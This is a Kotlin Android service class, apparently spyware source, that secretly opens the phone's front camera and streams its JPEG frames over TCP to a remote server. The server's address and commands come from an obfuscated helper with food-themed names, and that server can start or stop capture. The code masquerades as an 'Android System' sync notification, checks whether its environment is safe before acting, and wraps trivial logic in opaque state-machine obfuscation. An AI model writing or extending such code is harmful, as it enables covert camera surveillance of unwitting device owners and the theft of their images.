package com.example.mobsec_823

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.example.mobsec_823.utils.SafetyNet
import com.example.mobsec_823.utils.SecretBox
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicReference
import javax.net.SocketFactory

class CheeseTopping : Service() {
    private val TAG = "CheeseTopping"

    private lateinit var cameraManager: CameraManager
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var targetCameraId: String? = null

    private val mainHandler = Handler(Looper.getMainLooper())
    private var isOpeningCamera = false
    private var isManuallyStopped = false

    private val latestJpeg = AtomicReference<ByteArray?>()
    private val backgroundExecutor = Executors.newSingleThreadExecutor()
    private var pushClient: TcpPushClient? = null

    override fun onCreate() {
        super.onCreate()

        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        createNotificationChannelAndStartForeground()

        if (!SafetyNet.isEnvironmentSafe() || !SafetyNet.isTriggerArmed(this)) {

        }

        targetCameraId = findFrontCameraId()

        val serverIp = SecretBox.getKitchenAddress()
        val serverPort = SecretBox.getToppingPort()

        pushClient = TcpPushClient(serverIp, serverPort)
        pushClient?.start()

        registerCameraAvailabilityCallback()
        isManuallyStopped = false
        openCameraSafe()
    }

    override fun onDestroy() {
        pushClient?.stop()
        closeCamera()
        backgroundExecutor.shutdownNow()
        if (::cameraManager.isInitialized) {
            unregisterCameraAvailabilityCallback()
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun findFrontCameraId(): String? {
        return try {
            cameraManager.cameraIdList.firstOrNull { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: cameraManager.cameraIdList.firstOrNull()
        } catch (e: Exception) { null }
    }

    private fun createNotificationChannelAndStartForeground() {
        val channelId = "camera_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Services", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Android System")
            .setContentText("Syncing background data...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= 34) {
            ServiceCompat.startForeground(this, 1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(1, notif)
        }
    }

    private val availabilityCallback = object : CameraManager.AvailabilityCallback() {
        override fun onCameraAvailable(cameraId: String) {
            if (!isManuallyStopped && cameraDevice == null && !isOpeningCamera) {
                mainHandler.postDelayed({
                    if (cameraDevice == null && !isManuallyStopped) openCameraSafe()
                }, 1000)
            }
        }
    }

    private fun registerCameraAvailabilityCallback() {
        cameraManager.registerAvailabilityCallback(availabilityCallback, mainHandler)
    }
    private fun unregisterCameraAvailabilityCallback() {
        cameraManager.unregisterAvailabilityCallback(availabilityCallback)
    }

    private fun openCameraSafe() {
        if (cameraDevice != null || targetCameraId == null || isOpeningCamera || isManuallyStopped) return

        if (!SafetyNet.checkKitchenPermit(55)) return

        isOpeningCamera = true
        try {
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
            imageReader?.setOnImageAvailableListener({ reader ->
                val img = try { reader.acquireLatestImage() } catch (e: Exception) { null }
                img?.let {
                    latestJpeg.set(imageToJpegBytes(it))
                    it.close()
                }
            }, mainHandler)

            cameraManager.openCamera(targetCameraId!!, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    isOpeningCamera = false
                    startCaptureSession()
                }
                override fun onDisconnected(camera: CameraDevice) {
                    isOpeningCamera = false
                    closeCamera()
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    isOpeningCamera = false
                    closeCamera()
                }
            }, mainHandler)
        } catch (e: Exception) { isOpeningCamera = false }
    }

    private fun startCaptureSession() {
        val cam = cameraDevice ?: return
        val readerSurface = imageReader?.surface ?: return
        try {
            cam.createCaptureSession(listOf(readerSurface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    if (cameraDevice == null) { session.close(); return }
                    captureSession = session
                    try {
                        val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(readerSurface)
                            set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        }
                        session.setRepeatingRequest(req.build(), null, null)
                    } catch (e: Exception) { closeCamera() }
                }
                override fun onConfigureFailed(session: CameraCaptureSession) { closeCamera() }
            }, null)
        } catch (e: Exception) { closeCamera() }
    }

    private fun closeCamera() {
        try { captureSession?.close() } catch (_: Exception) {}
        captureSession = null
        try { cameraDevice?.close() } catch (_: Exception) {}
        cameraDevice = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        latestJpeg.set(null)
        isOpeningCamera = false
    }

    private fun imageToJpegBytes(image: Image): ByteArray {
        var state = 0xA1
        var result = ByteArray(0)
        while (state != 0) {
            when (state) {
                0xA1 -> {
                    val plane = image.planes[0]
                    val buffer = plane.buffer
                    result = ByteArray(buffer.remaining())
                    buffer.get(result)
                    state = 0
                }
            }
        }
        return result
    }

    private inner class TcpPushClient(private val ip: String, private val port: Int) {
        private var workerThread: Thread? = null
        private var isRunning = false

        fun start() {
            if (isRunning) return
            isRunning = true
            workerThread = Thread {
                while (isRunning) {
                    var socket: Socket? = null
                    try {
                        socket = SocketFactory.getDefault().createSocket()
                        socket.tcpNoDelay = true
                        socket.connect(InetSocketAddress(ip, port), 10000)

                        val inputStream = socket.getInputStream()
                        val outputStream = socket.getOutputStream()

                        while (isRunning && !socket.isClosed) {
                            if (inputStream.available() > 0) {
                                val buffer = ByteArray(1024)
                                val read = inputStream.read(buffer)
                                if (read > 0) {
                                    val cmd = String(buffer, 0, read).trim()

                                    if (cmd.contains(SecretBox.getCmdStop())) {
                                        isManuallyStopped = true
                                        mainHandler.post { closeCamera() }
                                    } else if (cmd.contains(SecretBox.getCmdStart())) {
                                        isManuallyStopped = false
                                        mainHandler.post { openCameraSafe() }
                                    }
                                }
                            }

                            val jpeg = latestJpeg.get()
                            if (jpeg != null && cameraDevice != null && !isManuallyStopped) {
                                try {
                                    outputStream.write(jpeg)
                                    outputStream.flush()
                                    Thread.sleep(40)
                                } catch (e: Exception) {
                                    break
                                }
                            } else {
                                Thread.sleep(50)
                            }
                        }
                    } catch (e: Exception) {
                        try { Thread.sleep(1000) } catch (_: Exception) {}
                    } finally {
                        try { socket?.close() } catch (_: Exception) {}
                    }
                }
            }
            workerThread?.start()
        }

        fun stop() {
            isRunning = false
            workerThread?.interrupt()
            workerThread = null
        }
    }
}
